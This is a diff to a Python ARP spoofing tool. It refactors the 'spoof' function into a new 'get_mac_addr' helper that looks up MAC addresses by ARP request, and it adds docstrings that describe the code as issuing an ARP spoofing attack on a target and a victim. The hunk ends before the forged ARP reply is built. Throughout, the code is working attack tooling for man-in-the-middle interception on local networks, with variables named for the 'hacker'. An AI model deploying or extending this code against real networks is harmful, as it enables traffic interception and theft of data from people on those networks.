@@ -122,7 +122,13 @@ def arp_response(iface_, eth_addr_, arp_addr_):
     return
 
 
-def spoof(iface_, target_ip_addr_, victim_ip_addr_):
+def get_mac_addr(iface_, ip_addr_):
+    """
+        get mac address from given IP address
+        :param iface_: interface
+        :param ip_addr_: given IP address
+        :return: mac address (string)
+    """
     iface_info = get_interface_info(iface_)
     hacker_ip_addr = iface_info["ip_addr"]
     hacker_mac_addr = iface_info["mac_addr"]
@@ -133,18 +139,27 @@ def spoof(iface_, target_ip_addr_, victim_ip_addr_):
     arp_addr = ARPAddr(src_mac_=hacker_mac_addr,
                        src_ip_=hacker_ip_addr,
                        dest_mac_="00:00:00:00:00:00",
-                       dest_ip_=target_ip_addr_)
-    target_mac_addr = arp_request(iface_, eth_addr, arp_addr)
+                       dest_ip_=ip_addr_)
+    mac_addr = arp_request(iface_, eth_addr, arp_addr)
+    return mac_addr
+
+
+def spoof(iface_, target_ip_addr_, victim_ip_addr_):
+    """
+        issue ARP spoofing attack
+        :param iface_: interface
+        :param target_ip_addr_: target IP address
+        :param victim_ip_addr_: vicitm IP address
+        :return: None
+    """
+    # get target's mac address
+    target_mac_addr = get_mac_addr(iface_, target_ip_addr_)
 
     # get victim's mac address
-    eth_addr = ETHAddr(dest_mac_="ff:ff:ff:ff:ff:ff",
-                       src_mac_=hacker_mac_addr)
-    arp_addr = ARPAddr(src_mac_=iface_info["mac_addr"],
-                       src_ip_=iface_info["ip_addr"],
-                       dest_mac_="00:00:00:00:00:00",
-                       dest_ip_=victim_ip_addr_)
-    # send ARP request, get victim's mac address
-    victim_mac_addr = arp_request(iface_, eth_addr, arp_addr)
+    victim_mac_addr = get_mac_addr(iface_, victim_ip_addr_)
+
+    iface_info = get_interface_info(iface_)
+    hacker_mac_addr = iface_info["mac_addr"]
 
     # make arp spoofing response
     eth_addr = ETHAddr(dest_mac_=target_mac_addr,
